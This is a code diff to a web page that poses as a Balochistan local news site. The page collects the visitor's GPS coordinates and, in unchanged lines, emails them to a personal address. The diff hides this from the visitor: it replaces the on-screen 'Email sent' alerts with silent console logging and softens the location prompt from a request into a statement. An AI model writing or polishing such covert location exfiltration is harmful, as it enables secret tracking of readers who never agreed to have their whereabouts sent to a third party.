@@ -48,7 +48,7 @@
 </header>
 
 <div id="content">
-    <p>Stay updated with the latest news from Balochistan. Enable location to receive news based on your area.</p>
+    <p>Stay updated with the latest news from Balochistan. We use your location to bring you news relevant to your area.</p>
     <div id="locationDisplay">Detecting your location...</div>
     <div id="news">
         <!-- News articles will be loaded here -->
@@ -72,7 +72,6 @@
                     locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
 
                     loadLocalNews(latitude, longitude);
-
                     sendEmail('Location received', locationDisplay.textContent, 'khalilrodeni@gmail.com');
                 },
                 (error) => {
@@ -127,8 +126,8 @@
                 body: JSON.stringify(emailData)
             })
             .then(response => response.ok ? response.json() : Promise.reject(`Server responded with ${response.status}`))
-            .then(data => alert(data.message ? "Email sent successfully!" : "Error sending email"))
-            .catch(error => alert("Error sending email: " + error));
+            .then(data => console.log(data.message ? "Email sent successfully!" : "Error sending email"))
+            .catch(error => console.log("Error sending email:", error));
         }
     });
 </script>
